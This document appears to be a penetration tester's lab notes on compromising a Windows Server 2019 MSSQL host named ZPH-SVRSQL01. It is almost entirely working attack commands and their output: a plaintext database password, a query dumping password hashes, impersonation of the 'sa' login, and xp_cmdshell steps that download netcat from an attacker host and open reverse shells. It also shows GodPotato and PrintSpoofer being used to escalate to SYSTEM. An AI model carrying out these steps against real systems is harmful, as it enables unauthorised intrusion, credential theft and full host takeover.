# ZPH-SVRSQL01

## MSSQL
## Impacket-MSSQLclient
```
impacket-mssqlclient zabbix@192.168.210.15
```

Password: rDhHbBEfh35sMbkY

### Listing users

```
SQL> select sp.name as login, sp.type_desc as login_type, sl.password_hash, sp.create_date, sp.modify_date, case when sp.is_disabled = 1 then 'Disabled' else 'Enabled' end as status from sys.server_principals sp left join sys.sql_logins sl on sp.principal_id = sl.principal_id where sp.type not in ('G', 'R') order by sp.name;
login
```

![[Pasted image 20231121073047.png]]

### Impersonate SA
```
EXECUTE AS LOGIN = 'sa'
SELECT SYSTEM_USER
SELECT IS_SRVROLEMEMBER('sysadmin')
```

![[Pasted image 20231121073713.png]]

### Enumeration
Versions
![[Pasted image 20231121090553.png]]
Linked Servers
![[Pasted image 20231121090637.png]]

### Transfer NC64.exe
```
SQL> xp_cmdshell "powershell iwr http://10.10.14.21/nc64.exe -O C:\users\public\Downloads\nc64.exe"
```

```
xp_cmdshell "C:\Users\Public\Downloads\nc64.exe 10.10.14.21 80 -e cmd.exe"
```
### ReverseShell
```
❯ sudo nc -lvnp 80
Listening on 0.0.0.0 80
Connection received on 10.10.110.35 60070
Microsoft Windows [Version 10.0.17763.4377]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>
```

## Privilege Escalation
```
C:\Windows\system32>whoami /priv
whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State   
============================= ========================================= ========
SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
SeCreateGlobalPrivilege       Create global objects                     Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled

```

## Enumeration
```
C:\Windows\system32>systeminfo
systeminfo

Host Name:                 ZPH-SVRSQL01
OS Name:                   Microsoft Windows Server 2019 Standard

```

## File Transfer Payload

### Printspoofer
```
powershell iwr http://10.10.14.21:443/PrintSpoofer64.exe -O C:\Users\Public\Downloads\ps.exe
```

### God Potato
```
powershell iwr http://10.10.14.21:443/GodPotato-NET4.exe -O C:\Users\Public\Downloads\exgp.exe
```

```
C:\Users\Public\Downloads>gp.exe -cmd "cmd /c whoami"
gp.exe -cmd "cmd /c whoami"
[*] CombaseModule: 0x140708901355520
[*] DispatchTable: 0x140708903661680
[*] UseProtseqFunction: 0x140708903037856
[*] UseProtseqFunctionParamCount: 6
[*] HookRPC
[*] Start PipeServer
[*] Trigger RPCSS
[*] DCOM obj GUID: 00000000-0000-0000-c000-000000000046
[*] DCOM obj IPID: 0000cc02-07e8-ffff-eef8-fa2938f9e6eb
[*] DCOM obj OXID: 0xb0383f00015a9686
[*] DCOM obj OID: 0xad2d0adacdfa9d91
[*] DCOM obj Flags: 0x281
[*] DCOM obj PublicRefs: 0x0
[*] Marshal Object bytes len: 100
[*] UnMarshal Object
[*] CreateNamedPipe \\.\pipe\a3624ff8-ce0a-4aa3-8e33-db8d99bbba04\pipe\epmapper
[*] Pipe Connected!
[*] CurrentUser: NT AUTHORITY\NETWORK SERVICE
[*] CurrentsImpersonationLevel: Impersonation
[*] Start Search System Token
[*] PID : 760 Token:0x924  User: NT AUTHORITY\SYSTEM ImpersonationLevel: Impersonation
[*] Find System Token : True
[*] UnmarshalObject: 0x80070776
[*] CurrentUser: NT AUTHORITY\SYSTEM
[*] process start with pid 1096
nt authority\system

```

### Exploit
```
C:\Users\Public\Downloads>gp.exe -cmd "nc64.exe -t -e C:\Windows\System32\cmd.exe 10.10.14.21 443"
```

```
❯ sudo nc -lvnp 443
[sudo] password for p3ta: 
Listening on 0.0.0.0 443
Connection received on 10.10.110.35 52906
Microsoft Windows [Version 10.0.17763.4377]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Users\Public\Downloads>whoami
whoami
nt authority\system

C:\Users\Public\Downloads>
